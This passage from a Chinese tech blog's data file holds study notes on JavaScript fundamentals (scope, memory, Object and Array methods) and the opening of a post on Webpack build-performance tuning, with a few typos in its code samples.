console.log(&apos;hhh&apos;);</span><br><span class=\"line\">        break;</span><br><span class=\"line\">    case 14:</span><br><span class=\"line\">        console.log(&apos;14&apos;);</span><br><span class=\"line\">        bresak;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>据JS精粹这本书，贯穿的时候，每个都写break：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">switch(i)&#123;</span><br><span class=\"line\">    case 12:</span><br><span class=\"line\">    case 13:</span><br><span class=\"line\">        break;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//上面写法易出错，且很难发现，应该这么写</span><br><span class=\"line\">switch(i)&#123;</span><br><span class=\"line\">    case 12:</span><br><span class=\"line\">        break;</span><br><span class=\"line\">    case 13:</span><br><span class=\"line\">        break;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>switch使用的全等操作符，所以并不会进行数据类型转换</strong></p>\n<ol start=\"7\">\n<li><p><strong>函数</strong></p>\n<ul>\n<li>函数定义时不必指定是否返回值；</li>\n<li>如果加了return，只执行到return语句，后面的永远不会被执行，</li>\n<li>例外：try catch语句，如果有finally，即使在try 或catch中写了return，仍然会执行finally里的代码</li>\n<li>如果return语句不加返回值，默认将返回undefined</li>\n</ul>\n</li>\n<li><p><strong>参数</strong></p>\n<ul>\n<li>arguments可以与命名参数一起使用</li>\n<li>arguments与数组相似：可以用arguments[n]来访问值，有length属性。但不是数组，没有数组的方法：slice、splice、shift、unshift、push、pop、concat、join、sort、reverse</li>\n<li>arguments的值永远与命名参数的值保持同步，其与命名参数并不是访问相同的内存空间，但是值会同步，没有传递值的；命名参数值默认被赋予undefined</li>\n<li><p><strong> 函数所有传参都是按值传递，不可能通过引用传参 </strong><br>结论：对于数字、字符串等是将它们的值传递给了函数参数，函数参数的改变不会影响函数外部的变量；对于数组和对象等是将对象(数组)变量的值传递给了函数参数，这个值是指向对象(数组)的地址。</p>\n<p><strong>函数传参的过程是把函数外部的变量的值复制给函数的局部变量，这个局部变量是指arguments的某个值。</strong><br>这句话对于理解引用类型传参时也是按值传递非常重要，检验是否理解引用类型按值传参的一段代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function setName(obj) &#123;</span><br><span class=\"line\">    obj.name = &apos;aaa&apos;;</span><br><span class=\"line\">    var obj = new Object();</span><br><span class=\"line\">    obj.name = &apos;ccc&apos;;</span><br><span class=\"line\">    return obj;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var person = new Object();</span><br><span class=\"line\">person.name = &apos;bbb&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">var newPerson = setName(person);</span><br><span class=\"line\">console.log(person.name + &apos; | &apos; + newPerson.name); // aaa | ccc</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"二、变量、作用域和内存问题\"><a href=\"#二、变量、作用域和内存问题\" class=\"headerlink\" title=\"二、变量、作用域和内存问题\"></a>二、变量、作用域和内存问题</h1><ol>\n<li><p><strong>基本类型和引用类型的值</strong></p>\n<ul>\n<li>定义基本类型值和引用类型值的过程：创建一个变量并为该变量赋值</li>\n<li>基本类型值指的是简单的数据段，而引用类型值指可能有多个值构成的对象</li>\n<li>5种基本数据类型是按值访问的，因为可以操作保存在变量中的实际的值</li>\n<li>引用类型的值是保存在内存中的对象的地址。JavaScript不允许直接访问内存中的位置，也就是说不能直接操作对象的内存空间。</li>\n<li>操作对象时，实际上是在操作对象的引用而不是实际的对象。为此，引用类型的值是按引用访问的</li>\n</ul>\n</li>\n<li><p><strong>堆栈</strong></p>\n<p> 堆存储：类似书架与书，存取没有顺序，只要知道书的名字，就可以方便的取出想要的书<br> 栈存储：类似羽毛球筒与羽毛球，先存后取，后存先取，要拿中间某一个球必须先把它上面的球全拿出来</p>\n<p> 栈的优势是存取速度比堆快，缺点是存在栈中的数据大小与生存期必须是确定的，缺乏灵活性。堆的优势是可以动态分配内存大小，生存期也不必事先告诉编译器，垃圾收集器会自动地收走这些不再使用的数据，但是缺点是由于在运行时动态分配内存，所以存取速度较慢。</p>\n<p> 基本类型值，一旦赋值，大小就固定了，因此存储在栈内存中。引用类型的值，可以动态的改变，例如定义一个对象之后，还可以给它添加变量和方法，因此大小不固定，所以存储在堆内存中。</p>\n<p> js中的基础类型变量，都是存放在变量对象中，JavaScript属于高级语言，高级语言中严格意义上来说并没有堆栈的区分。但是一些特殊场景会在逻辑上实现栈的存取方式，这才有了堆与栈的不同。</p>\n<p> 理解堆栈存储：</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Person(id,name,age)&#123; </span><br><span class=\"line\">    this.id = id; </span><br><span class=\"line\">    this.name = name; </span><br><span class=\"line\">    this.age = age; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\">var num = 10; </span><br><span class=\"line\">var bol = true; </span><br><span class=\"line\">var str = &quot;abc&quot;; </span><br><span class=\"line\">var obj = new Object(); </span><br><span class=\"line\">var arr = [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;]; </span><br><span class=\"line\">var person = new Person(100,&quot;jxl&quot;,22);</span><br></pre></td></tr></table></figure>\n<p> <a href=\"http://o798x2hdw.bkt.clouddn.com/stack.png\" target=\"_blank\" rel=\"noopener\">stack-pic</a></p>\n</li>\n<li><p><strong>赋值变量值</strong></p>\n<ul>\n<li>从一个变量向另一个变量复制基本类型值，会在变量对象上创建一个新值，然后把该值复制到为新变量分配的位置上。</li>\n<li>当复制引用类型的值时，会将原变量的值复制一份放到为新变量分配的空间中。不同的是这个值是一个指针，改变其中一个变量会影响到另一个变量<br><a href=\"http://o798x2hdw.bkt.clouddn.com/copy-variable.png\" target=\"_blank\" rel=\"noopener\">copy_variable-pic</a></li>\n</ul>\n</li>\n<li><p><strong>传递参数</strong></p>\n<ul>\n<li>JS中所有参数都是按值传递的</li>\n<li>把函数外部的值复制给函数内部参数，就和把值从一个变量复制到另一个变量一样</li>\n<li>传递引用类型值时传递的是指针，因此在函数中对局部变量参数的修改会反映到函数外部</li>\n<li>可以把函数参数想象成局部变量</li>\n</ul>\n</li>\n<li><p><strong>检测类型</strong></p>\n<ul>\n<li>检测基本类型值（number\\string\\undefined\\boolean）用typeof，检测引用类型值用instanceof</li>\n<li>如果是对象或<strong>null</strong>，typeof会返回”object”</li>\n<li>如果是function，typeof会返回”function”</li>\n<li><p>如果变量是给定引用类型的实例，instanceof 操作符就会返回 true</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var person = function()&#123;</span><br><span class=\"line\">  this.name = &quot;aa&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var bill  = new person();</span><br><span class=\"line\">console.log(bill instanceof person)  //true</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>用instanceof检测基本类型值，始终返回false，因为基本类型值不是对象</p>\n</li>\n</ul>\n</li>\n<li><p><strong>执行环境及作用域</strong></p>\n<ul>\n<li><strong>执行环境（execution context）</strong>定义了变量或函数有权访问的其他数据</li>\n<li>每个函数有自己的执行环境，每个执行环境有一个相关联的<strong>变量对象(variable object)</strong>，保存环境中所有的变量和函数</li>\n<li>全局执行环境是最外围的执行环境，在web浏览器中是window对象，所有全局的变量和函数都是作为window的属性和方法</li>\n<li>某个执行环境的所有代码执行完毕后，该环境其中的变量和函数全部销毁</li>\n<li>而全局执行环境在程序退出时销毁，web浏览器中对应关闭网页时</li>\n<li><strong>ECMAScript程序的执行流：</strong>每个函数都有自己的执行环境，当执行流进入一个函数时，函数的环境就被推入一个环境栈中。函数执行后，栈将其环境弹出，把控制权返还给之前的执行环境</li>\n<li><strong>作用域链</strong>，作用域链前端，是当前执行的代码所在环境的变量对象，如果环境是函数，就把函数的<strong>活动对象（activation object）</strong>作为变量对象。活动对象最开始只包含一个变量，即arguments对象（全局环境中不包含），作用域链下一个变量对象来自包含环境，这样一直延续到全局环境。</li>\n<li><strong>延长作用域链</strong>：with和try catch中的catch块可以延长作用域链，即在作用域链的前端临时添加一个变量对象，该变量对象在代码执行完毕后被移除。</li>\n<li>对于catch语句，会创建一个新的变量对象，其中包含对被抛出的错误对象的声明。<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function withLocation()&#123;</span><br><span class=\"line\">    with(location)&#123;</span><br><span class=\"line\">        var url = href;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    reutrn url</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// with语句内部，定义了一个url变量，因而url就成了函数执行环境的一部分，所以可以作为函数的值被返回。</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ol>\n<pre><code>- 标识符解析会沿着作用域链一级一级进行查找，直到找到声明变量的地方，假设局部环境有`var color = &quot;red&quot;`,此时在局部环境中只有使用`window.color`才可以访问在全局变量中定义的color\n- 变量查询有代价会比较慢，所以访问局部变量会比访问全局变量快，但现在差距几乎可以忽略\n</code></pre><ol start=\"7\">\n<li><p><strong>垃圾收集</strong></p>\n<ul>\n<li>JS具有自动垃圾收集机制，执行环境会负责管理代码执行过程中使用的内存，即内存分配和无用内存的回收</li>\n<li>这种自动垃圾收集机制的原理是：找出不再使用的变量，然后销毁释放其占用的内存。垃圾收集器会隔段时间就周期性地执行这一操作</li>\n<li>浏览器中对垃圾收集的实现方式包含：引用计数和标记清除两种</li>\n<li><strong>标记清除</strong>：当变量进入环境时（如在函数中声明一个变量）标记为“进入环境”，当变量离开环境时，标记为“离开环境”</li>\n<li><strong>引用计数</strong>：跟踪每个值被引用的次数，当引用次数为0时就在下一次垃圾收集器运行时销毁这个变量。</li>\n<li>当循环引用时，引用计数不能清除变量，会造成内存泄漏</li>\n<li>IE9之前版本中部分DOM和BOM对象不是原生JS对象，而是C++实现的COM对象，涉及到COM对象与原生JS对象的相互引用时，即使页面中的BOM对象\\DOM对象从页面移除了，他也不会被回收</li>\n<li>为了避免此类问题，在不使用的时候，手动断开DOM元素与原生JS对象间的连接</li>\n</ul>\n</li>\n<li><p><strong>管理内存</strong></p>\n<ul>\n<li>电脑分配给Web浏览器的内存比分给桌面程序的少，以避免浏览器耗尽内存引发系统崩溃</li>\n<li>这个内存限制，会对给变量分配内存造成影响，并影响调用栈以及在一个线程中同时执行的语句数量。</li>\n<li>所以为了获得更好的页面性能，需要注意<strong>优化内存使用</strong>，就是不使用的变量就解除引用，局部变量会在离开执行环境时自动解除引用，所以要注意的就是全局变量不使用时就解除引用。</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"三、引用类型\"><a href=\"#三、引用类型\" class=\"headerlink\" title=\"三、引用类型\"></a>三、引用类型</h1><ol>\n<li><p><strong>Object类型</strong></p>\n<ul>\n<li>创建Object实例包含两种方法：<code>new Object()</code>和对象字面量<code>var obj = {}</code>，使用对象字面量创建对象，不会调用Object构造函数</li>\n<li><code>var obj = {}</code>是一个表达式上下文，表达式上下文指的是能够返回一个值；<code>if(a==b)</code>是一个语句上下文</li>\n<li>在最后一个属性后面添加逗号，会在一些浏览器中导致错误</li>\n<li>属性名可以是数值，此时会自动转换为数值字符串</li>\n<li>在向函数传递大量可选参数时，最好的做法是对那些必需值使用命名参数，而使用对象字面量来封装多个可选参数</li>\n<li>访问对象属性有两种：点和方括号，方括号的优点是可以通过变量来访问属性<code>var a = &quot;name&quot;; console.log(person[a])</code>，并且可以兼容比较奇怪的属性名：<code>person[&quot;first name&quot;] = &quot;Nicholas&quot;;</code>通常使用点方法访问</li>\n</ul>\n</li>\n<li><p><strong>Array类型</strong></p>\n<ul>\n<li><p>创建Array实例的方式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// Array构造函数方式</span><br><span class=\"line\">var arr1 = new Array(&quot;a&quot;,&quot;b&quot;);</span><br><span class=\"line\">var arr2 = Array(&quot;a&quot;, &quot;b&quot;);</span><br><span class=\"line\">var arr3 = Array(3);        </span><br><span class=\"line\"></span><br><span class=\"line\">// 数组字面量方式</span><br><span class=\"line\">var arr4 = [1,2,3];</span><br><span class=\"line\"></span><br><span class=\"line\">var arrFault = [,,,];  //不推荐!</span><br><span class=\"line\">var arrFault2 = [1,2,] //不推荐!</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在使用数组字面量表示法时，也不会调用 Array 构造函数【？】</p>\n</li>\n<li><p>关于length:</p>\n<ol>\n<li><p>如果索引值超出length，会自动以undefined补全长度</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var arr=[1,2,3]</span><br><span class=\"line\">console.log(arr[5])      //undefined</span><br><span class=\"line\">console.log(arr.length)  //5</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>可以通过设置length值，修改数组，截短或加长</p>\n</li>\n</ol>\n</li>\n<li><p>检测数组</p>\n<ol>\n<li>instanceof检测法<code>if(value instanceof Array)</code>，问题在于它假定只有一个全局执行环境，因为Array是window的属性。如果网页中包含多个frame，那实际上就存在多个window，即两个以上不同的全局执行环境，从而存在两个以上不同版本的 Array 构造函数。如果你从一个框架向另一个框架传入一个数组，那么传入的数组与在第二个框架中原生创建的数组分别具有各自不同的构造函数。</li>\n<li>ECMAScript 5 新增了 Array.isArray()方法。这个方法的目的是最终确定某个值到底是不是数组，而不管它是在哪个全局执行环境中创建的。兼容性IE9+</li>\n<li><p>22.1.1章节中的安全的类型检测的方法，可以解决低版本浏览器的类型检测问题</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function isArray(value)&#123;</span><br><span class=\"line\">    return Object.prototype.toString().call(value)==&quot;[object Array]&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>原理：在任何值上调用 Object 原生的 toString()方法，都会返回一个[object NativeConstructorName]格式的字符串。用来区分是否是JS原生对象，任何开发人员自定义的构造函数都将返回”[object Object]”。</p>\n</li>\n</ol>\n</li>\n<li>转换方法：toString、toLocaleString返回由每一项调用toString、toLocaleString得到的字符串组成的数组；valueOf返回原数组；arr.join(“”)拼接数组成字符串</li>\n<li>栈方法（后进先出）与队列方法（先进先出）<ol>\n<li>push / pop：数组末尾添加/删除，push可添加多项，返回数组长度；pop移除一项，返回被移除的项</li>\n<li>shift / unshift：在数组前端移除 / 添加一项，shift返回移除的项，unshift可添加多项，返回新数组长度</li>\n<li>shift和pop，都只能移除一项，返回移除的项；unshift和push都可增加多项，并返回新数组长度。</li>\n</ol>\n</li>\n<li><p>排序：reverse反序和sort排序</p>\n<ol>\n<li>sort用法<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">arr.sort(fun)</span><br><span class=\"line\">function fun(a,b)&#123;</span><br><span class=\"line\">    return a-b</span><br><span class=\"line\">    // 返回负值，a排在前面；返回0，顺序不变；返回正值，a排在后面</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n</li>\n<li><p>操作方法：concat、slice、splice</p>\n<ol>\n<li>concat参数为数组时，是把每一项添加到原数组中，可以用来给多维数组降维</li>\n<li>slice方法可接受一或两个参数，即要返回项的起始和结束位置，不会影响原始数组，若参数中有一个负数，则用数组长度加上该数来确定相应的位置</li>\n<li>splice最强大的数组方法，可以删除、插入和替换，主要用途是向数组的中部插入项，会改变原数组。返回一个数组，包含从原数组中删除的项（如果没有删除任何项，返回空数组）<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">splice(0,2)</span><br><span class=\"line\">  //删除数组中的前两项</span><br><span class=\"line\">splice(2,0,&quot;red&quot;,&quot;green&quot;)</span><br><span class=\"line\">  //从当前数组的位置 2 开始插入字符串&quot;red&quot;和&quot;green&quot;</span><br><span class=\"line\">splice (2,1,&quot;red&quot;,&quot;green&quot;)</span><br><span class=\"line\">  //删除当前数组位置 2 的项，然后再从位置 2 开始插入字符串&quot;red&quot;和&quot;green&quot;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n</li>\n<li><p>位置方法：indexOf()和 lastIndexOf()，二者的区别在于，从头查和从尾查，在没查到的情况下返回-1。在比较第一个参数<br>与数组中的每一项时，<strong>使用全等（===）操作符</strong>。</p>\n</li>\n<li>迭代方法：every、filter、forEach、map、some，都不会修改原数组，传入的函数接收三个参数：数组项的值、该项在数组中的位置和数组对象本身。<code>function(item, index, arr){}</code><ol>\n<li>every()：对数组中的每一项运行给定函数，若该函数对每一项都返回 true，则返回 true</li>\n<li>filter()：对数组中的每一项运行给定函数，返回该函数会返回true项组成的数组</li>\n<li>forEach()：对数组中的每一项运行给定函数。这个方法没有返回值</li>\n<li>map()：对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组</li>\n<li>some()：对数组中的每一项运行给定函数，如果该函数对任一项返回 true，则返回 true</li>\n</ol>\n</li>\n<li>归并方法ruduce和reduceRight，迭代数组的所有项，然后构建一个最终返回的值，区别是左起遍历还是右起遍历。传给 reduce()和 reduceRight()的函数接收4参数：前一个值、当前值、项的索引和数组对象。该函数返回的值会作为第一个参数自动传给下一项。第一次迭代发生在数组的第二项上，因此第一个参数是数组的第一项，第二个参数就是数组的第二项。迭代和归并方法是ES5引入的方法，IE9+支持<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var values = [1,2,3,4,5];</span><br><span class=\"line\">var sum = values.reduce(function(prev, cur, index, array)&#123;</span><br><span class=\"line\">return prev + cur;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">alert(sum); //15</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ol>\n<hr>\n<blockquote>\n<p>本文地址：<a href=\"http://supermaryy.com/2016/09/20/read-book-professional-javascript4\">http://supermaryy.com/2016/09/20/read-book-professional-javascript4</a></p>\n</blockquote>\n<p>Reference：</p>\n<ol>\n<li><a href=\"http://www.jianshu.com/p/996671d4dcc4#\" target=\"_blank\" rel=\"noopener\">前端基础进阶（一）：内存空间详细图解</a></li>\n<li><a href=\"http://www.2cto.com/kf/201506/409654.html\" target=\"_blank\" rel=\"noopener\">深入理解javascript之内存分配</a></li>\n</ol>"},{"title":"三十分钟掌握Webpack性能优化","date":"2018-08-02T12:30:00.000Z","toc":true,"comments":1,"_content":"Webpack是现在主流的功能强大的模块化打包工具，在使用Webpack时，如果不注意性能优化，有非常大的可能会产生性能问题，性能问题主要分为开发时打包构建速度慢、开发调试时的重复性工作、以及输出文件质量不高等，因此性能优化也主要从这些方面来分析。本文主要是根据自己的理解对《深入浅出Webpack》这本书进行总结，涵盖了大部分的优化方法，可以作为Webpack性能优化时的参考和检查清单。基于Webpack3.4版本，阅读本文需要您熟悉Webpack基本使用方法，读完大约需要三十分钟。\n\n<!-- more -->\n\n> From  [http://supermaryy.com](http://luckymona.github.com)\n\n## 一、优化构建速度\n\nWebpack在启动后会根据Entry配置的入口出发，递归地解析所依赖的文件。这个过程分为搜索文件和把匹配的文件进行分析、转化的两个过程，因此可以从这两个角度来进行优化配置。\n\n### 1.1 缩小文件的搜索范围\n\n**搜索过程优化方式包括：**\n\n1. **`resolve`字段告诉webpack怎么去搜索文件，所以首先要重视resolve字段的配置：**\n\n   1. 设置`resolve.modules:[path.resolve(__dirname, 'node_modules')]`避免层层查找。\n\n      `resolve.modules`告诉webpack去哪些目录下寻找第三方模块，默认值为`['node_modules']`，会依次查找./node_modules、../node_modules、../../node_modules。\n\n   2. 设置`resolve.mainFields:['main']`，设置尽量少的值可以减少入口文件的搜索步骤\n\n      第三方模块为了适应不同的使用环境，会定义多个入口文件，mainFields定义使用第三方模块的哪个入口文件，由于大多数第三方模块都使用main字段描述入口文件的位置，所以可以设置单独一个main值，减少搜索\n\n   3. 对庞大的第三方模块设置`resolve.alias`, 使webpack直接使用库的min文件，避免库内解析\n\n      如对于react：\n\n      ```javascript\n      resolve.alias:{\n      \t'react':patch.resolve(__dirname, './node_modules/react/dist/react.min.js')\n      }\n      ```\n\n      这样会影响Tree-Shaking，适合对整体性比较强的库使用，如果是像lodash这类工具类的比较分散的库，比较适合Tree-Shaking，避免使用这种方式。\n\n   4. 合理配置`resolve.extensions`，减少文件查找\n\n      默认值：`extensions:['.js', '.json']`,当导入语句没带文件后缀时，Webpack会根据extensions定义的后缀列表进行文件查找，所以：\n\n      - 列表值尽量少\n      - 频率高的文件类型的后缀写在前面\n      - 源码中的导入语句尽可能的写上文件后缀，如`require(./data)`要写成`require(./data.json)`\n\n2. **`module.noParse`字段告诉Webpack不必解析哪些文件，可以用来排除对非模块化库文件的解析**\n\n   如jQuery、ChartJS，另外如果使用resolve.alias配置了react.min.js，则也应该排除解析，因为react.min.js经过构建，已经是可以直接运行在浏览器的、非模块化的文件了。noParse值可以是RegExp、[RegExp]、function\n\n   `module:{ noParse:[/jquery|chartjs/, /react\\.min\\.js$/] }`\n\n3. **配置loader时，通过test、exclude、include缩小搜索范围**\n\n### 1.2 使用DllPlugin减少基础模块编译次数     \n\nDllPlugin动态链接库插件，**其原理是**把网页依赖的基础模块抽离出来打包到dll文件中，当需要导入的模块存在于某个dll中时，这个模块不再被打包，而是去dll中获取。**为什么会提升构建速度呢？**原因在于dll中大多包含的是常用的第三方模块，如react、react-dom，所以只要这些模块版本不升级，就只需被编译一次。我认为这样做和配置resolve.alias和module.noParse的效果有异曲同工的效果。\n\n**使用方法：**\n\n1. 使用DllPlugin配置一个webpack_dll.config.js来构建dll文件：\n\n   ```javascript\n   // webpack_dll.config.js\n   const path = require('path');\n   const DllPlugin = require('webpack/lib/DllPlugin');\n   module.exports = {\n    entry:{\n        react:['react','react-dom'],\n        polyfill:['core-js/fn/promise','whatwg-fetch']\n    },\n    output:{\n        filename:'[name].dll.js',\n        path:path.resolve(__dirname, 'dist'),\n        library:'_dll_[name]',  //dll的全局变量名\n    },\n    plugins:[\n        new DllPlugin({\n            name:'_dll_[name]',  //dll的全局变量名\n            path:path.join(__dirname,'dist','[name].manifest.json'),//描述生成的manifest文件\n        })\n    ]\n   }\n   ```\n   需要注意DllPlugin的参数中name值必须和output.library值保持一致，并且生成的manifest文件中会引用output.library值。\n\n   最终构建出的文件：\n\n   ```javascript\n    |-- polyfill.dll.js\n    |-- polyfill.manifest.json\n    |-- react.dll.js\n    └── react.manifest.json\n   ```\n   其中xx.dll.js包含打包的n多模块，这些模块存在一个数组里，并以数组索引作为ID，通过一个变量假设为\\_xx\\_dll暴露在全局中，可以通过window.\\_xx\\_dll访问这些模块。xx.manifest.json文件描述dll文件包含哪些模块、每个模块的路径和ID。然后再在项目的主config文件里使用DllReferencePlugin插件引入xx.manifest.json文件。\n\n2. 在主config文件里使用DllReferencePlugin插件引入xx.manifest.json文件：\n\n   ```javascript\n   //webpack.config.json\n   const path = require('path');\n   const DllReferencePlugin = require('webpack/lib/DllReferencePlugin');\n   module.exports = {\n       entry:{ main:'./main.js' },\n       //... 省略output、loader等的配置\n       plugins:[\n           new DllReferencePlugin({\n               manifest:require('./dist/react.manifest.json')\n           }),\n           new DllReferenctPlugin({\n               manifest:require('./dist/polyfill.manifest.json')\n           })\n       ]\n   }\n   ```\n   最终构建生成`main.js`\n\n### 1.3 使用HappyPack开启多进程Loader转换\n\n在整个构建流程中，最耗时的就是Loader对文件的转换操作了，而运行在Node.js之上的Webpack是单线程模型的，也就是只能一个一个文件进行处理，不能并行处理。HappyPack可以将任务分解给多个子进程，最后将结果发给主进程。JS是单线程模型，只能通过这种多进程的方式提高性能。   \n\nHappyPack使用如下：\n\n```javascript\nnpm i -D happypack\n// webpack.config.json\nconst path = require('path');\nconst HappyPack = require('happypack');\n\nmodule.exports = {\n    //...\n    module:{\n        rules:[{\n                test:/\\.js$/，\n                use:['happypack/loader?id=babel']\n                exclude:path.resolve(__dirname, 'node_modules')\n            },{\n                test:/\\.css/,\n                use:['happypack/loader?id=css']\n            }],\n        plugins:[\n            new HappyPack({\n                id:'babel',\n                loaders:['babel-loader?cacheDirectory']\n            }),\n            new HappyPack({\n                id:'css',\n                loaders:['css-loader']\n            })\n        ]\n    }\n}\n```\n\n除了id和loaders，HappyPack还支持这三个参数：`threads、verbose、threadpool`，threadpool代表共享进程池，即多个HappyPack实例都用同个进程池中的子进程处理任务，以防资源占用过多。\n\n### 1.4 使用ParallelUglifyPlugin开启多进程压缩JS文件\n\n使用UglifyJS插件压缩JS代码时，需要先将代码解析成Object表示的AST（抽象语法树），再去应用各种规则去分析和处理AST，所以这个过程计算量大耗时较多。ParallelUglifyPlugin可以开启多个子进程，每个子进程使用UglifyJS压缩代码，可以并行执行，能显著缩短压缩时间。\n\n使用也很简单，把原来的UglifyJS插件换成本插件即可，使用如下：\n\n```javascript\nnpm i -D webpack-parallel-uglify-plugin\n\n// webpack.config.json\nconst ParallelUglifyPlugin = require('wbepack-parallel-uglify-plugin');\n//...\nplugins: [\n    new ParallelUglifyPlugin({\n        uglifyJS:{\n            //...这里放uglifyJS的参数\n        },\n        //...其他ParallelUglifyPlugin的参数，设置cacheDir可以开启缓存，加快构建速度\n    })\n]\n```\n\n## 二、优化开发体验\n\n开发过程中修改源码后，需要自动构建和刷新浏览器，以查看效果。这个过程可以使用Webpack实现自动化，Webpack负责监听文件的变化，DevServer负责刷新浏览器。\n\n### 2.1 使用自动刷新\n\n#### 2.1.1 Webpack监听文件\n\nWebpack可以使用两种方式开启监听：1. 启动webpack时加上--watch参数；2. 在配置文件中设置watch:true。此外还有如下配置参数。合理设置watchOptions可以优化监听体验。\n\n```javascript\nmodule.exports = {\n    watch: true,\n    watchOptions: {\n        ignored: /node_modules/,\n        aggregateTimeout: 300,  //文件变动后多久发起构建，越大越好\n        poll: 1000,  //每秒询问次数，越小越好\n    }\n}\n```\n\nignored：设置不监听的目录，排除node_modules后可以显著减少Webpack消耗的内存\n\naggregateTimeout：文件变动后多久发起构建，避免文件更新太快而造成的频繁编译以至卡死，越大越好\n\npoll：通过向系统轮询文件是否变化来判断文件是否改变，poll为每秒询问次数，越小越好\n\n#### 2.1.2 DevServer刷新浏览器\n\n**DevServer刷新浏览器有两种方式**：\n\n1. 向网页中注入代理客户端代码，通过客户端发起刷新\n2. 向网页装入一个iframe，通过刷新iframe实现刷新效果\n\n默认情况下，以及 `devserver: {inline:true}` 都是采用第一种方式刷新页面。第一种方式DevServer因为不知道网页依赖哪些Chunk，所以会向每个chunk中都注入客户端代码，当要输出很多chunk时，会导致构建变慢。而一个页面只需要一个客户端，**所以关闭inline模式可以减少构建时间**，chunk越多提升月明显。关闭方式：\n\n1. 启动时使用webpack-dev-server --inline false\n2. 配置 `devserver:{inline:false}`\n\n关闭inline后入口网址变为http://localhost:8080/webpack-dev-server/\n\n另外`devServer.compress` 参数可配置是否采用Gzip压缩，默认为false\n\n### 2.2 开启模块热替换HMR\n\n模块热替换不刷新整个网页而只重新编译发生变化的模块，并用新模块替换老模块，所以预览反应更快，等待时间更少，同时不刷新页面能保留当前网页的运行状态。原理也是向每一个chunk中注入代理客户端来连接DevServer和网页。开启方式：\n\n1. webpack-dev-server --hot\n2. 